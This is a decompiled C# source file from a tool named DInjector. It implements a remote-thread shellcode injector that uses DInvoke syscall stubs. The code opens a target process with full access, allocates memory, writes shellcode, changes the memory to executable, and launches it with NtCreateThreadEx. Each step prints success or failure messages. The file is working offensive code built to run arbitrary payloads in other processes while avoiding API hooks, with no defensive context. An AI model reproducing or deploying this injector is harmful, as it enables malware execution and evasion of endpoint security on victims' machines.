using System;
using System.Runtime.InteropServices;
using DInvoke.Data;
using DInvoke.DynamicInvoke;

namespace DInjector
{
	// Token: 0x02000011 RID: 17
	internal class RemoteThread
	{
		// Token: 0x06000035 RID: 53 RVA: 0x0000452C File Offset: 0x0000272C
		public static void Execute(byte[] shellcodeBytes, int processID)
		{
			RemoteThread.NtOpenProcess ntOpenProcess = (RemoteThread.NtOpenProcess)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtOpenProcess"), typeof(RemoteThread.NtOpenProcess));
			IntPtr zero = IntPtr.Zero;
			RemoteThread.OBJECT_ATTRIBUTES object_ATTRIBUTES = default(RemoteThread.OBJECT_ATTRIBUTES);
			RemoteThread.CLIENT_ID client_ID = new RemoteThread.CLIENT_ID
			{
				UniqueProcess = (IntPtr)processID
			};
			DInvoke.Data.Native.NTSTATUS ntstatus = ntOpenProcess(ref zero, Win32.Kernel32.ProcessAccessFlags.PROCESS_ALL_ACCESS, ref object_ATTRIBUTES, ref client_ID);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThread) [+] NtOpenProcess");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThread) [-] NtOpenProcess: {0}", ntstatus));
			}
			RemoteThread.NtAllocateVirtualMemory ntAllocateVirtualMemory = (RemoteThread.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtAllocateVirtualMemory"), typeof(RemoteThread.NtAllocateVirtualMemory));
			IntPtr zero2 = IntPtr.Zero;
			IntPtr intPtr = (IntPtr)shellcodeBytes.Length;
			ntstatus = ntAllocateVirtualMemory(zero, ref zero2, IntPtr.Zero, ref intPtr, Win32.Kernel32.MEM_COMMIT | Win32.Kernel32.MEM_RESERVE, 4U);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThread) [+] NtAllocateVirtualMemory, PAGE_READWRITE");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThread) [-] NtAllocateVirtualMemory, PAGE_READWRITE: {0}", ntstatus));
			}
			RemoteThread.NtWriteVirtualMemory ntWriteVirtualMemory = (RemoteThread.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtWriteVirtualMemory"), typeof(RemoteThread.NtWriteVirtualMemory));
			IntPtr intPtr2 = Marshal.AllocHGlobal(shellcodeBytes.Length);
			Marshal.Copy(shellcodeBytes, 0, intPtr2, shellcodeBytes.Length);
			uint num = 0U;
			ntstatus = ntWriteVirtualMemory(zero, zero2, intPtr2, (uint)shellcodeBytes.Length, ref num);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThread) [+] NtWriteVirtualMemory");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThread) [-] NtWriteVirtualMemory: {0}", ntstatus));
			}
			Marshal.FreeHGlobal(intPtr2);
			uint num2;
			ntstatus = ((RemoteThread.NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtProtectVirtualMemory"), typeof(RemoteThread.NtProtectVirtualMemory)))(zero, ref zero2, ref intPtr, 32U, out num2);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThread) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READ");
			}
			else
			{
				Console.WriteLine(string.Format("(RemoteThread) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READ: {0}", ntstatus));
			}
			RemoteThread.NtCreateThreadEx ntCreateThreadEx = (RemoteThread.NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(Generic.GetSyscallStub("NtCreateThreadEx"), typeof(RemoteThread.NtCreateThreadEx));
			IntPtr zero3 = IntPtr.Zero;
			ntstatus = ntCreateThreadEx(out zero3, Win32.WinNT.ACCESS_MASK.MAXIMUM_ALLOWED, IntPtr.Zero, zero, zero2, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
			if (ntstatus == DInvoke.Data.Native.NTSTATUS.Success)
			{
				Console.WriteLine("(RemoteThread) [+] NtCreateThreadEx");
				return;
			}
			Console.WriteLine(string.Format("(RemoteThread) [-] NtCreateThreadEx: {0}", ntstatus));
		}

		// Token: 0x02000056 RID: 86
		// (Invoke) Token: 0x060000DA RID: 218
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtOpenProcess(ref IntPtr ProcessHandle, Win32.Kernel32.ProcessAccessFlags DesiredAccess, ref RemoteThread.OBJECT_ATTRIBUTES ObjectAttributes, ref RemoteThread.CLIENT_ID ClientId);

		// Token: 0x02000057 RID: 87
		// (Invoke) Token: 0x060000DE RID: 222
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

		// Token: 0x02000058 RID: 88
		// (Invoke) Token: 0x060000E2 RID: 226
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, IntPtr Buffer, uint BufferLength, ref uint BytesWritten);

		// Token: 0x02000059 RID: 89
		// (Invoke) Token: 0x060000E6 RID: 230
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

		// Token: 0x0200005A RID: 90
		// (Invoke) Token: 0x060000EA RID: 234
		[UnmanagedFunctionPointer(CallingConvention.StdCall)]
		private delegate DInvoke.Data.Native.NTSTATUS NtCreateThreadEx(out IntPtr threadHandle, Win32.WinNT.ACCESS_MASK desiredAccess, IntPtr objectAttributes, IntPtr processHandle, IntPtr startAddress, IntPtr parameter, bool createSuspended, int stackZeroBits, int sizeOfStack, int maximumStackSize, IntPtr attributeList);

		// Token: 0x0200005B RID: 91
		private struct OBJECT_ATTRIBUTES
		{
			// Token: 0x04000285 RID: 645
			public int Length;

			// Token: 0x04000286 RID: 646
			public IntPtr RootDirectory;

			// Token: 0x04000287 RID: 647
			public IntPtr ObjectName;

			// Token: 0x04000288 RID: 648
			public uint Attributes;

			// Token: 0x04000289 RID: 649
			public IntPtr SecurityDescriptor;

			// Token: 0x0400028A RID: 650
			public IntPtr SecurityQualityOfService;
		}

		// Token: 0x0200005C RID: 92
		private struct CLIENT_ID
		{
			// Token: 0x0400028B RID: 651
			public IntPtr UniqueProcess;

			// Token: 0x0400028C RID: 652
			public IntPtr UniqueThread;
		}
	}
}
